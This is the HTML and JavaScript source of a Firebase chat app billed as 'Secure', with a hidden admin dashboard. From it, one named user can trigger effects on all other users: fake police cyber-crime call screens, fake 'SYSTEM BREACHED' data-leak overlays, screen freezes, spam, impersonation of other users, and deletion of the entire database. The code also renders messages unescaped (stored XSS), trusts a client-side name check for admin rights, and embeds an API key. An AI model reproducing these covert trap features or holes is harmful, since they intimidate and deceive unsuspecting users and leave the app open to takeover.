<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Secure</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --bg: #05070a; --primary: #58a6ff; --danger: #ff4b4b; --neon-green: #00ff41; --border: rgba(255, 255, 255, 0.1); }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: #e6edf3; overflow: hidden; transition: 0.5s; }
        .app { max-width: 500px; margin: auto; height: 100vh; position: relative; display: flex; flex-direction: column; background: #010409; }
        
        header { padding: 18px; background: rgba(22, 27, 34, 0.95); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(12px); z-index: 1000; }
        header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 1px; font-weight: 700; color: var(--primary); }

        .page { display: none; padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 180px; }
        .active { display: block; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        /* SHAITANI DASHBOARD */
        #nazim-dashboard { display: none; background: #000; border: 1px solid var(--danger); padding: 15px; margin: 10px; border-radius: 12px; flex-wrap: wrap; gap: 8px; box-shadow: 0 0 20px rgba(255, 75, 75, 0.4); }
        .pwr-btn { flex: 1; min-width: 90px; padding: 10px; font-size: 10px; background: #161b22; border: 1px solid var(--danger); color: var(--danger); cursor: pointer; font-weight: bold; border-radius: 6px; text-transform: uppercase; }
        .pwr-btn:hover { background: var(--danger); color: white; }

        /* UI PRANKS */
        .flip-mode { transform: rotate(180deg); }
        #fake-call { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:100000; color:white; text-align:center; padding-top:100px; }
        #scare-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: var(--neon-green); flex-direction:column; align-items:center; justify-content:center; font-family: 'Courier New', monospace; }

        /* Message Bubbles */
        .msg { position: relative; padding: 12px 16px; border-radius: 18px; max-width: 75%; font-size: 14px; margin-bottom: 10px; }
        .msg.me { align-self: flex-end; background: #238636; border-bottom-right-radius: 2px; }
        .msg.other { align-self: flex-start; background: #21262d; border-bottom-left-radius: 2px; border: 1px solid var(--border); }
        .del-msg { position: absolute; top: -8px; right: -8px; background: var(--danger); width: 20px; height: 20px; border-radius: 50%; font-size: 10px; display: none; align-items: center; justify-content: center; cursor: pointer; }
        .msg:hover .del-msg { display: flex; }

        .input-wrap { position: absolute; bottom: 85px; width: 100%; padding: 0 15px; box-sizing: border-box; }
        .modern-input { background: #161b22; border: 1px solid var(--border); border-radius: 30px; display: flex; align-items: center; padding: 5px 15px; }
        .modern-input input { flex: 1; background: transparent; border: none; color: white; padding: 12px; outline: none; }
    </style>
</head>
<body>

<div id="fake-call">
    <div style="font-size:30px; margin-bottom:10px;">Police (Cyber Crime)</div>
    <div style="font-size:18px; color:#8b949e;">Tracing Location...</div>
    <div style="margin-top:200px;">
        <button onclick="this.parentElement.parentElement.style.display='none'" style="width:70px; height:70px; border-radius:50%; background:#da3633; border:none; color:white; font-size:25px;"><i class="fa-solid fa-phone-slash"></i></button>
    </div>
</div>

<div id="scare-overlay">
    <i class="fa-solid fa-skull" style="font-size: 80px; color: red;"></i>
    <h2 id="scare-status">> SYSTEM BREACHED</h2>
    <div id="log-box" style="font-size: 12px; text-align: left; width: 80%;"></div>
</div>

<div class="app">
    <header><h1>LIVE CONNECT</h1><i class="fa-solid fa-eye" style="color:var(--primary)"></i></header>

    <div id="loginPage" class="page active">
        <div style="text-align:center; margin-top:80px;">
            <input type="text" id="userInput" class="modern-input" placeholder="Enter Codename" style="text-align:center; margin: 20px auto; width: 80%;">
            <button onclick="initApp()" style="width:80%; padding:15px; background:var(--primary); color:white; border:none; border-radius:30px; font-weight:bold;">INITIALIZE</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div onclick="openChat('global', false)" style="background:var(--glass); padding:20px; border-radius:15px; border:1px solid var(--primary); cursor:pointer;"><b>Global Network</b></div>
        <div id="userList" style="margin-top:20px;"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="nazim-dashboard">
            <button class="pwr-btn" onclick="sendHack('freeze')">Freeze</button>
            <button class="pwr-btn" onclick="sendHack('scare')">Data Leak</button>
            <button class="pwr-btn" onclick="sendHack('call')">Police Call</button>
            <button class="pwr-btn" onclick="sendHack('flip')">Flip Screen</button>
            <button class="pwr-btn" onclick="sendHack('spam')">Spam Attack</button>
            <button class="pwr-btn" onclick="sendHack('restore')" style="color:lime; border-color:lime">Restore</button>
            <button class="pwr-btn" onclick="nukeAll()" style="background:red; color:white;">NUKE ALL</button>
        </div>
        <div id="msgStream" style="display:flex; flex-direction:column;"></div>
        <div class="input-wrap">
            <div class="modern-input">
                <i id="admin-wand" class="fa-solid fa-wand-magic-sparkles" style="display:none; color:gold; margin-right:10px; cursor:pointer;" onclick="document.getElementById('nazim-dashboard').style.display='flex'"></i>
                <input type="text" id="msgInp" placeholder="Type message...">
                <i class="fa-solid fa-paper-plane" style="color:var(--primary); cursor:pointer;" onclick="sendMsg()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE",
    databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
let user = null, room = "global", isPriv = false;
const ADMIN = "Nazim";

window.initApp = () => {
    user = document.getElementById("userInput").value.trim();
    if(!user) return;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("homePage").classList.add("active");
    if(user === ADMIN) document.getElementById("admin-wand").style.display="block";

    // MASTER TRAP LISTENER
    onValue(ref(db, "traps/" + user), snap => {
        const t = snap.val();
        if(t === "freeze") { document.getElementById("scare-overlay").style.display="flex"; }
        if(t === "call") { document.getElementById("fake-call").style.display="block"; }
        if(t === "flip") { document.body.classList.toggle("flip-mode"); }
        if(t === "spam") { for(let i=0; i<30; i++) push(ref(db, "streams/global"), { s: "SYSTEM", t: "NAZIM IS YOUR LORD! 👑" }); }
        if(t === "scare") { document.getElementById("scare-overlay").style.display="flex"; runLogs(); }
        if(t === "restore") { document.getElementById("scare-overlay").style.display="none"; document.getElementById("fake-call").style.display="none"; document.body.classList.remove("flip-mode"); }
    });

    if(user !== ADMIN) set(ref(db, "active_users/" + user), true);
    syncUsers();
};

function runLogs() {
    const lines = ["> BYPASSING SECURITY...", "> FETCHING IP: 192.168.1.1", "> EXPORTING DATA...", "> SUCCESS."];
    let i = 0; setInterval(() => { if(i < lines.length) document.getElementById("log-box").innerHTML += lines[i++] + "<br>"; }, 600);
}

window.openChat = (target, priv) => {
    room = priv ? [user, target].sort().join("::") : "global";
    isPriv = priv;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    loadMessages();
};

window.sendMsg = () => {
    const inp = document.getElementById("msgInp");
    if(!inp.value) return;
    if(user === ADMIN && inp.value.startsWith("/as ")) {
        const p = inp.value.split(" ");
        push(ref(db, "streams/global"), { s: p[1], t: inp.value.replace("/as "+p[1]+" ", "") });
        inp.value = ""; return;
    }
    push(ref(db, isPriv ? "streams/priv/" + room : "streams/global"), { s: user, t: inp.value });
    inp.value = "";
};

function loadMessages() {
    const path = isPriv ? "streams/priv/" + room : "streams/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("msgStream"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `msg ${d.s === user ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.s}</b>${d.t} ${(user === ADMIN) ? `<span class="del-msg" onclick="remove(ref(db,'${path}/${m.key}'))">✕</span>` : ''}`;
            box.appendChild(div);
        });
        box.parentElement.scrollTop = box.parentElement.scrollHeight;
    });
}

function syncUsers() {
    onValue(ref(db, "active_users"), snap => {
        const list = document.getElementById("userList"); list.innerHTML = "";
        snap.forEach(u => { if(u.key !== user) {
            let d = document.createElement("div"); d.style = "padding:15px; background:#161b22; margin-bottom:10px; border-radius:10px; cursor:pointer;";
            d.innerHTML = `${u.key} <i class="fa-solid fa-bolt" style="float:right; color:gold"></i>`;
            d.onclick = () => openChat(u.key, true);
            list.appendChild(d);
        }});
    });
}

window.sendHack = (type) => {
    onValue(ref(db, "active_users"), snap => {
        snap.forEach(u => { if(u.key !== ADMIN) set(ref(db, "traps/" + u.key), type); });
    }, {onlyOnce: true});
};

window.nukeAll = () => { if(confirm("☢️ DELETE EVERYTHING?")) remove(ref(db)); };
document.getElementById("msgInp").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendMsg(); });
</script>
</body>
</html>
